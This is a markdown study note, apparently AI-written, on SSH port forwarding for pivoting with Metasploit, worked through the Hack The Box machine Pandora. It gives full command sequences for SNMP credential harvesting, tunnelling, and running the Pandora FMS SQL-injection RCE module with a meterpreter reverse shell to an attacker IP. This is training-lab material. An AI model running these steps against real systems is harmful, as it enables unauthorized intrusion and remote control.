---
title: "SSH Portfwding with metasploit"
description: "Your original guide is mostly correct for local port forwarding (ssh -L), but it lacks clarity on why things work and when to use different approaches…"
category: tunneling-pivoting
tags: ["tunneling-pivoting", "tunneling"]
tools: ["Metasploit", "Meterpreter"]
difficulty: intermediate
updated: "2026-08-10"
source: "vault:Misc/SSH Portfwding with metasploit .md"
---
# SSH Tunneling with Metasploit: A Complete Guide (Pandora HTB Edition)

Your original guide is **mostly correct** for local port forwarding (`ssh -L`), but it lacks clarity on *why* things work and when to use different approaches. Let me clarify the confusion and expand with the Pandora HTB box as a practical example.

---

## Understanding the Pandora HTB Scenario

**The Problem:**
* Pandora HTB has a **Pandora FMS web application** running on `127.0.0.1:80` (localhost only)
* It's bound ONLY to loopback—you **cannot** access it from your attacker machine directly
* You gain SSH access as `daniel` user via SNMP credential leak
* You need to access this internal web service to exploit it

**The Solution:** SSH local port forwarding

---

## Part 1: SSH Local Port Forward (`ssh -L`) - The Pandora Way

### What It Actually Does

```bash
ssh -L 9001:localhost:80 daniel@10.10.11.136
```

**This creates a PORT MAPPING:**
* Your machine listens on `127.0.0.1:9001`
* Any connection to YOUR `127.0.0.1:9001` → tunneled through SSH → TARGET's `localhost:80`

**Critical Understanding:**
* The `localhost:80` part is resolved **from the target's perspective**
* You could also forward to OTHER machines the target can reach: `ssh -L 9001:10.10.10.5:80 daniel@target`

### Verify the Tunnel

From **your machine**:

```bash
curl -i http://127.0.0.1:9001/pandora_console/
# Or in browser: http://127.0.0.1:9001/pandora_console/
```

If you see the Pandora FMS login page, the tunnel works.

---

## Part 2: Metasploit Configuration with `ssh -L`

### Core Principle: You're Targeting YOUR Local Endpoint

When using `ssh -L`, Metasploit connects to **your local tunnel endpoint**, NOT the remote IP.

### Configuration for Pandora FMS Exploit

```bash
msfconsole
use exploit/linux/http/pandora_fms_sqli_rce
show options
```

**Set these options:**

| Option | Value | Why |
|--------|-------|-----|
| `RHOSTS` | `127.0.0.1` | The tunnel endpoint is on YOUR localhost |
| `RPORT` | `9001` | YOUR local listening port (not 80!) |
| `SSL` | `false` | Port 80 is HTTP, not HTTPS |
| `TARGETURI` | `/pandora_console/` | Application base path |
| `USERNAME` | `admin` | Default or discovered credentials |
| `PASSWORD` | `pandora` | Default or discovered credentials |
| `Proxies` | **UNSET** | `ssh -L` is NOT a proxy |

**Commands:**

```bash
set RHOSTS 127.0.0.1
set RPORT 9001
set SSL false
set TARGETURI /pandora_console/
set USERNAME admin
set PASSWORD pandora
unset Proxies
```

---

## Part 3: The Critical LHOST Confusion (Reverse Shells)

### The Two Separate Connections

When you exploit a service, there are **TWO different network connections**:

1. **Exploit Delivery** (Metasploit → Web Service):
   * Goes through the tunnel
   * RHOSTS=127.0.0.1, RPORT=9001

2. **Reverse Shell** (Target → Attacker):
   * Does NOT go through the tunnel (usually)
   * LHOST=your_real_IP (e.g., tun0 10.10.14.x)

### LHOST Settings for Pandora HTB

```bash
set LHOST 10.10.14.50  # Your tun0 VPN IP
set LPORT 4444         # Port where YOU listen for callback
```

**Why NOT `127.0.0.1`?**
* If LHOST=127.0.0.1, you're telling the target to connect to **its own** localhost
* The reverse shell would try to connect to itself and fail

**Why does this work without another tunnel?**
* The target **can reach** your VPN IP directly (10.10.14.x)
* Only the *web service* is localhost-only
* The target machine itself has normal network connectivity

### Complete Exploit Command

```bash
use exploit/linux/http/pandora_fms_sqli_rce
set RHOSTS 127.0.0.1    # Tunnel endpoint on YOUR machine
set RPORT 9001          # YOUR local port
set SSL false
set TARGETURI /pandora_console/
set USERNAME admin
set PASSWORD pandora
set LHOST 10.10.14.50   # YOUR tun0 IP (for reverse shell)
set LPORT 4444
set PAYLOAD linux/x64/meterpreter/reverse_tcp
exploit
```

---

## Part 4: When to Use `ssh -D` (Dynamic SOCKS Proxy)

### The Difference

`ssh -D` is **completely different** from `ssh -L`:

| Feature | `ssh -L` (Local Forward) | `ssh -D` (SOCKS Proxy) |
|---------|-------------------------|------------------------|
| Type | Direct port mapping | Application-level proxy |
| Targets | ONE specific host:port | ANY host:port through proxy |
| Setup | One tunnel per port | One proxy for everything |
| Metasploit Config | RHOSTS=127.0.0.1, no Proxies | RHOSTS=actual_target, set Proxies |

### Creating a SOCKS Proxy

```bash
ssh -D 1080 daniel@10.10.11.136
```

This creates a **SOCKS5 proxy** on YOUR `127.0.0.1:1080`.

### Metasploit Configuration with SOCKS Proxy

**Key difference:** You now target the **actual remote host**, not 127.0.0.1:

```bash
setg Proxies socks5:127.0.0.1:1080
set RHOSTS 10.10.11.136    # Actual target IP
set RPORT 80               # Actual remote port
set SSL false
```

**What happens:**
1. Metasploit connects to the SOCKS proxy at 127.0.0.1:1080
2. Proxy forwards the connection through SSH to 10.10.11.136:80
3. The target's localhost services are still unreachable (SOCKS doesn't help here)

### When to Use SOCKS (`ssh -D`)

* **Multiple targets/ports** behind the SSH server
* Scanning entire internal networks
* Dynamic reconnaissance
* When you don't know which ports you'll need in advance

For Pandora HTB specifically, **`ssh -L` is simpler** because you only need one specific port.

---

## Part 5: Advanced Scenario - `ssh -R` (Reverse Tunnel)

### When Target Cannot Reach You

Sometimes the target **cannot** connect back to your IP:
* Double NAT
* Firewall blocking outbound
* No route to your network

**Solution:** Reverse port forward

### How `ssh -R` Works

```bash
# On your machine, create reverse tunnel:
ssh -R 4444:localhost:4444 daniel@10.10.11.136

# In another terminal, start local listener:
nc -lvnp 4444
```

**What this does:**
* Target's `localhost:4444` → tunneled back through SSH → YOUR `localhost:4444`
* When target connects to its own localhost:4444, it reaches your listener

### Metasploit with Reverse Tunnel

```bash
# Terminal 1: Start handler on your machine
msfconsole
use multi/handler
set PAYLOAD linux/x64/shell/reverse_tcp
set LHOST 127.0.0.1     # Listen locally
set LPORT 4444
run

# Terminal 2: Create reverse tunnel and exploit
ssh -R 4444:localhost:4444 daniel@10.10.11.136

# Terminal 3: Run exploit with tunnel settings
msfconsole
use exploit/linux/http/pandora_fms_sqli_rce
set RHOSTS 127.0.0.1   # Web service tunnel
set RPORT 9001
set LHOST 127.0.0.1    # Target connects to its localhost
set LPORT 4444         # Which forwards to you via ssh -R
set PAYLOAD linux/x64/shell/reverse_tcp
exploit
```

---

## Part 6: Complete Pandora HTB Workflow

### Step 1: Reconnaissance

```bash
# Enumerate SNMP (finds daniel's credentials)
snmpwalk -v 2c -c public 10.10.11.136
```

### Step 2: SSH Access

```bash
ssh daniel@10.10.11.136
# Password discovered via SNMP
```

### Step 3: Port Forward (keep this running)

```bash
ssh -L 9001:localhost:80 daniel@10.10.11.136 -N
# -N means "don't execute commands, just forward"
```

### Step 4: Verify Access

```bash
curl http://127.0.0.1:9001/pandora_console/
```

### Step 5: Exploit with Metasploit

```bash
msfconsole -q
use exploit/linux/http/pandora_fms_sqli_rce

# Access the web service via tunnel
set RHOSTS 127.0.0.1
set RPORT 9001
set SSL false
set TARGETURI /pandora_console/

# Credentials (default or discovered)
set USERNAME admin
set PASSWORD pandora

# Reverse shell comes back directly (not through tunnel)
set LHOST 10.10.14.50    # Your tun0 IP
set LPORT 4444

# Payload
set PAYLOAD linux/x64/meterpreter/reverse_tcp

# No proxy needed for ssh -L
unset Proxies

show options
check
exploit
```

---

## Part 7: Common Mistakes & Fixes

### ❌ Mistake 1: Setting RHOSTS to Target IP

```bash
set RHOSTS 10.10.11.136  # WRONG with ssh -L
set RPORT 80
```

**Why it fails:** You're bypassing the tunnel and trying to connect directly (which is blocked).

**Fix:**
```bash
set RHOSTS 127.0.0.1   # Your local tunnel endpoint
set RPORT 9001         # Your local port
```

---

### ❌ Mistake 2: Setting LHOST to 127.0.0.1

```bash
set LHOST 127.0.0.1    # WRONG for standard reverse shell
```

**Why it fails:** Target tries to connect to its own localhost, not you.

**Fix:**
```bash
set LHOST 10.10.14.50  # Your tun0 IP that target can reach
```

---

### ❌ Mistake 3: Using Proxies with `ssh -L`

```bash
set Proxies socks5:127.0.0.1:1080  # WRONG with ssh -L
```

**Why it's wrong:** `ssh -L` is not a proxy, it's a direct port mapping.

**Fix:**
```bash
unset Proxies
unsetg Proxies
```

---

### ❌ Mistake 4: Wrong SSL Setting

```bash
set SSL true  # WRONG when forwarding HTTP port 80
```

**Why it fails:** Metasploit tries HTTPS but port 80 speaks HTTP.

**Fix:**
```bash
set SSL false  # Match the actual protocol
```

---

## Part 8: Decision Tree

### Which Tunneling Method?

```
Need to access localhost-only service?
│
├─ YES: Need ONE specific port?
│   └─ Use: ssh -L 9001:localhost:80 user@target
│   └─ Metasploit: RHOSTS=127.0.0.1, RPORT=9001, unset Proxies
│
├─ YES: Need MULTIPLE ports/hosts?
│   └─ Use: ssh -D 1080 user@target
│   └─ Metasploit: setg Proxies socks5:127.0.0.1:1080, RHOSTS=actual_IP
│
└─ NO: Direct access works
    └─ Just set RHOSTS=target_IP normally
```

### Can Target Reach You for Reverse Shell?

```
Target can connect to your IP?
│
├─ YES (normal case):
│   └─ LHOST=your_tun0_IP (e.g., 10.10.14.50)
│
├─ NO (firewall/NAT blocks):
│   └─ Use: ssh -R 4444:localhost:4444 user@target
│   └─ LHOST=127.0.0.1 (target's localhost forwards to you)
│
└─ UNSURE:
    └─ Try: python3 -m http.server 8000
    └─ On target: curl http://your_IP:8000
    └─ If works: use your_IP, if fails: use ssh -R
```

---

## Part 9: Auxiliary/Scanner Modules (No LHOST Needed)

For modules that just **query** the service (no reverse shell):

```bash
use auxiliary/scanner/http/http_version
set RHOSTS 127.0.0.1
set RPORT 9001
set SSL false
unset Proxies
run
```

**Notice:** No LHOST/LPORT because there's no reverse connection.

---

## Summary Table: Metasploit Settings by Tunnel Type

| Tunnel Type | RHOSTS | RPORT | Proxies | LHOST (if reverse shell) |
|-------------|--------|-------|---------|--------------------------|
| `ssh -L 9001:localhost:80` | `127.0.0.1` | `9001` | **unset** | Your real IP (10.10.14.x) |
| `ssh -D 1080` | Actual target IP | Actual port | `socks5:127.0.0.1:1080` | Your real IP (10.10.14.x) |
| `ssh -R 4444:localhost:4444` | `127.0.0.1` (for web) | `9001` (for web) | **unset** | `127.0.0.1` (target's localhost) |
| No tunnel | Actual target IP | Actual port | **unset** | Your real IP (10.10.14.x) |

---

## What Your Original Guide Got Right

* ✅ RHOSTS=127.0.0.1 for `ssh -L`
* ✅ RPORT=local_listening_port for `ssh -L`
* ✅ Unset Proxies for `ssh -L`
* ✅ LHOST/LPORT mostly not needed for scanner modules

## What It Missed

* ❌ **WHY** RHOSTS is 127.0.0.1 (it's YOUR local endpoint)
* ❌ LHOST for reverse shells (needs your real IP)
* ❌ When to use `ssh -D` vs `ssh -L`
* ❌ `ssh -R` for when target can't reach you
* ❌ The distinction between "accessing service" and "receiving reverse shell"

---

This guide should clear up the confusion. The Pandora HTB example is perfect for understanding these concepts because it demonstrates the exact scenario where `ssh -L` shines.
